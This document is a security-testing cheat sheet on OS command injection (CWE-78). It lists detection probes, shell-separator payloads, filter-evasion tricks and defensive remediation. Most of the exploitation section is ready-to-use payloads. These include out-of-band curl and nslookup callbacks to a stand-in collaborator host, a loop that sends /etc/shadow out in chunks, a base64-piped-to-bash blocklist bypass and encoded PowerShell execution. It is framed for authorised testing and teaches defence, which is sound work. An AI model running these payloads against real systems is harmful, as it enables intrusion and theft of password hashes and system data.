# OS Command Injection

> User input reaches a shell-invoking function (`system`, `exec`, `Runtime.exec`, `subprocess.run(..., shell=True)`) without proper escaping. Authorized testing only. Map: WSTG-INPV-12, CWE-78.

## TL;DR
- Distinct from RCE-via-deserialization / SSTI: command injection is specifically shell-metacharacter injection.
- Separators: `;`, `&`, `&&`, `|`, `||`, `` `cmd` ``, `$(cmd)`, newlines.
- Blind (no output reflected) is common; confirm with OOB DNS/HTTP listener.
- Defence: use the argv form (`subprocess.run(["cmd", arg])`, `Runtime.exec(String[])`) — *no shell*. Argument validation second.

## Detection / Discovery
| Probe | Goal |
| --- | --- |
| `; sleep 5 ;` (Unix) or `& timeout 5 &` (Windows) | Time-based blind detection |
| `$(id)` `` `id` `` | Reflected output if response echoes input |
| `\| nslookup x.<COLLAB>` | OOB confirmation when no in-band response |
| `127.0.0.1; whoami` | Most-basic ping-utility injection |
| `127.0.0.1 %0a id` | Newline as separator (filters that strip `;` miss `\n`) |

```bash
# Typical injectable param: ping / nslookup / dig / file-converter / image-resizer / archive extractor
curl "https://target/ping?host=127.0.0.1%3B+id"
```

## Exploitation

### In-band reflected
```
127.0.0.1; id
127.0.0.1 && id
127.0.0.1 | id
127.0.0.1 || id
127.0.0.1 `id`
127.0.0.1 $(id)
```

### Blind — OOB confirmation
```
127.0.0.1; curl http://<COLLAB>/$(id|base64)
127.0.0.1; nslookup $(id|base64).<COLLAB>
```
Run `interactsh-client` / Burp Collaborator to capture the callback; the `$(id|base64)` substitutes server-side and shows up in DNS.

### File exfil with size limits
DNS labels ≤ 63 chars; chunk:
```
for i in 1 2 3 4; do
  curl "https://target/ping?host=127.0.0.1;%20dd%20if=/etc/shadow%20bs=63%20count=1%20skip=$((i-1))%20|%20base64%20|%20tr%20-d%20%27\\n%27%20|%20xargs%20-I{}%20curl%20http://<COLLAB>/{}/$i"
done
```

### Windows
```
127.0.0.1 & whoami
127.0.0.1 && net user
127.0.0.1 | dir
127.0.0.1 ; powershell -e <base64>          # works in some shells; PowerShell as command host
```

## Bypasses
- Space filter: `${IFS}` (Bash internal field separator) replaces literal space; `{cmd,arg1,arg2}` braces; `<>` redirection chunks.
  ```
  cat$IFS/etc/passwd
  {cat,/etc/passwd}
  ```
- Slash filter: `\${PATH:0:1}` evaluates to `/`; `$(printf '\057')`.
- Keyword blocklist: `c""at` (empty quotes), `c\at`, `c$@at`, base64-then-pipe-to-bash `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash`.
- Length-limited: chain short commands or send via env var (`X=cat; $X /etc/passwd`).
- Windows specifics: `^` is escape (`ne^t user`), `,` is also separator in some shells.

## Defence / Remediation
- **Argument-vector APIs**: `subprocess.run(["cmd", arg1, arg2])` in Python (with `shell=False` default), `Runtime.exec(String[])` in Java, `child_process.execFile(cmd, [args])` in Node. The shell is never invoked.
- **Allow-list of values** if input must be a name (e.g., `iface in {eth0, eth1}`); reject everything else.
- **Strict input validation** with positive model (`^[a-zA-Z0-9._-]+$`) — never blocklist of metachars; new attack chars appear constantly.
- **Drop capabilities** of the process; run as a low-priv user; `seccomp` to block `execve` if the process never needs it.
- **WAF rules** for known injection patterns as defence-in-depth.
- CWE-78 Improper Neutralization of Special Elements used in an OS Command.

## Sources
- OWASP WSTG-INPV-12: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection
- OWASP Cheat Sheet — OS Command Injection Defense: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- PortSwigger — OS command injection: https://portswigger.net/web-security/os-command-injection
- PayloadsAllTheThings Command Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- HackTricks Command Injection: https://book.hacktricks.wiki/en/pentesting-web/command-injection.html
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
